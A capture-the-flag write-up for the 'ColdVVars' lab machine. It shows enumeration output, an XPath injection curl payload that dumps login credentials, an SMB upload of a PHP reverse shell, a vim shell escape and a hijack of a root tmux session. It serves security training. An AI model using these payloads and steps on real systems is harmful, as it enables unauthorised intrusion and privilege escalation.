COLDVVARS
=========

Initial scan with nmap

```bash
# Nmap 7.91 scan initiated Mon Jul 12 18:35:15 2021 as: nmap --min-rate 300 -sC -sV -A -oN initial 10.10.66.56
Nmap scan report for 10.10.239.74 (10.10.239.74)
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host: INCOGNITO

Host script results:
|_clock-skew: mean: 1m35s, deviation: 0s, median: 1m35s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-07-12T13:07:07+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-12T13:07:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 12 18:35:35 2021 -- 1 IP address (1 host up) scanned in 20.30 seconds
```

smb shared are not allowed anonymous login so we need to find some credentials.

```bash
[+] Guest session       IP: 10.10.239.74:445    Name: 10.10.239.74                                      
        Disk            Permissions     Comment
        ----            -----------     -------
        print$          NO ACCESS       Printer Drivers
        SECURED         NO ACCESS       Dev
        IPC$            NO ACCESS       IPC Service (incognito server (Samba, Ubuntu))
```

there are 2 webpage are hosted in 2 ports try `gobuster` and find any hidden directory

found `note.txt` file in port `8080`.

<br>

```bash
└─$ gobuster dir -u http://10.10.239.74:8080/dev  -w /usr/share/dirb/wordlists/common.txt -x txt,bak,old,html -t 40              1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.74:8080/dev
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,bak,old,html
[+] Timeout:                 10s
===============================================================
2021/07/13 21:33:43 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/note.txt             (Status: 200) [Size: 45] 
===============================================================
2021/07/13 21:35:12 Finished
===============================================================
```
<br>

![](/Images/coldvvars/note.png)

<br>

next `gobuster` scan 2<sup>nd</sup> website on port `8081`.

```bash
└─$ gobuster dir -u http://10.10.239.74:8082  -w /usr/share/dirb/wordlists/common.txt -x txt,bak,old,html -t 40                  1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.239.74:8082
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              bak,old,html,txt
[+] Timeout:                 10s
===============================================================
2021/07/13 21:39:51 Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 200) [Size: 1605]
/login                (Status: 200) [Size: 1605]
/static               (Status: 301) [Size: 179] [--> /static/]
                                                              
===============================================================
2021/07/13 21:41:19 Finished
===============================================================
```

we can find login page in there,

![](/Images/coldvvars/login.png)

after trying something figure it out its vulnerable to `XPath Injection` you can read about it [**here**](https://medium.com/@shatabda/security-xpath-injection-what-how-3162a0d4033b).

using this command

```bash
curl -X 'POST' -d $'username=\" or 1=1 or \"a\"=\"a&password=a&submit=Login' 'http://10.10.239.74:8082/login'
```

![](/Images/coldvvars/xpathi.png)

now lets try those username and password with `smb`, luckily one set match.

```bash
└─$ smbmap -H 10.10.239.74 -u ArthurMorgan -p DeadEye                      1 ⚙
[+] IP: 10.10.239.74:445        Name: 10.10.239.74                                
        Disk                    Permissions     Comment
        ----                    -----------     -------
        print$                  READ ONLY       Printer Drivers
        SECURED                 READ, WRITE     Dev
        IPC$                    NO ACCESS       IPC Service (incognito server (Samba, Ubuntu))
```

login in smb using `smbclient` and download any interesting file.

`smbclient //10.10.239.74/SECURED --user=ArthurMorgan%DeadEye`

![](/Images/coldvvars/smb.png)

when we download we can see its content same as `note.txt` we found in web.
so we can upload php reverse shell to same `smb` share

```bash
└─$ smbclient //10.10.239.74/SECURED --user=ArthurMorgan%DeadEye                                                                 1 ⚙
Try "help" to get a list of possible commands.
smb: \> put rev.php 
putting file rev.php as \rev.php (11.9 kb/s) (average 11.9 kb/s)
smb: \> 
```

start nc listner and execute file and get the shell.

![](/Images/coldvvars/shell.png)

There are so many `tmux` sessions maybe those will come in handy. 

currently we are `www-data` user we can try is same password reused.

as expected same password work, so now need to find another way to escalate, when we enumerate find this in `env`.

```bash
ArthurMorgan@incognito:~$ env
APACHE_LOG_DIR=/var/log/apache2
LANG=en_US.UTF-8
INVOCATION_ID=06c6f19506b04e35ad1a0e98d169f3d0
APACHE_LOCK_DIR=/var/lock/apache2
XDG_SESSION_ID=c1
USER=ArthurMorgan
PWD=/home/ArthurMorgan
HOME=/home/ArthurMorgan
JOURNAL_STREAM=9:19597
APACHE_RUN_GROUP=www-data
APACHE_RUN_DIR=/var/run/apache2
APACHE_RUN_USER=www-data
OPEN_PORT=4545
MAIL=/var/mail/ArthurMorgan
SHELL=/bin/sh
TERM=xterm
APACHE_PID_FILE=/var/run/apache2/apache2.pid
SHLVL=2
LOGNAME=ArthurMorgan
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
_=/usr/bin/env
OLDPWD=/
```

port `4545` is open try to connect to that port and see.

![](/Images/coldvvars/esca.png)

4th option will exit to `vim` from that we can escape to `marston` terminal, go can check it from [gtfobin](https://gtfobins.github.io/gtfobins/vim/#shell)

![](/Images/coldvvars/arthur.png)

its not stable shell so using that we need to get better shell, start nc listner with different port.

![](/Images/coldvvars/marston.png)

We can see user `marston` tmux dettached sessions, we can attach session with.

```
tmux attach			# attach session

"CTRL + B" then "6"		# move to 6th panel in tmux

"CTRL + B" then "UP arrow"	# move to up window which is root terminal

"CTRL + B" then "d"		# to dettach from tmux
```

after following steps we can get into root terminal and we can read the `root.txt` flag.

![](/Images/coldvvars/root.png)

Happy Hacking!!!
